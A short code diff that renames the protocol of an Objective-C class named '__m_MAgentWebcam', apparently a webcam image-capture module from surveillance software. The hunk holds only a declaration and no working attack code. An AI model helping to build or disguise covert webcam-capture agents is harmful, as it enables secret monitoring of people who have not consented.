@@ -21,7 +21,7 @@ typedef struct _webcam {
 // End of Chiodo
 
 
-@interface __m_MAgentWebcam : NSObject <Agents> 
+@interface __m_MAgentWebcam : NSObject <__m_Agents> 
 {
 @private
   BOOL                              mImageGrabbed;
